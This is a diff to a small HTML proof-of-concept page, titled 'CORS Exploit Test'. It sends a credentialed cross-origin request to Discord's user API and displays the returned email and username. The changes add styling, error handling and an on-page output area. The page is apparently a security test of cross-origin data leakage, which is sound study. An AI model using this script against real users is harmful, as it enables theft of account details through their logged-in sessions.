@@ -2,24 +2,49 @@
 <html>
 <head>
   <title>CORS Exploit Test</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      padding: 20px;
+    }
+    .result {
+      margin-top: 20px;
+      padding: 10px;
+      border: 1px solid #ccc;
+      background-color: #f9f9f9;
+    }
+    .error {
+      color: red;
+    }
+  </style>
 </head>
 <body>
   <h1>CORS Exploit Test</h1>
   <button onclick="sendRead()">Test Read</button>
 
+  <div id="output" class="result"></div>
+
   <script>
     function sendRead() {
+      const output = document.getElementById("output");
+      output.innerHTML = "Loading...";
+
       fetch("https://discord.com/api/v9/users/@me", {
         method: "GET",
         credentials: "include"
       })
-      .then(response => response.json())
+      .then(response => {
+        if (!response.ok) throw new Error("HTTP error " + response.status);
+        return response.json();
+      })
       .then(data => {
         const email = data.email || "Email not available";
         const username = data.username || "Username not available";
-        alert("Email: " + email + "\nUsername: " + username);
+        output.innerHTML = `<strong>Email:</strong> ${email}<br><strong>Username:</strong> ${username}`;
       })
-      .catch(err => alert("Read failed: " + err));
+      .catch(err => {
+        output.innerHTML = `<span class="error">Read failed: ${err.message}</span>`;
+      });
     }
   </script>
 </body>
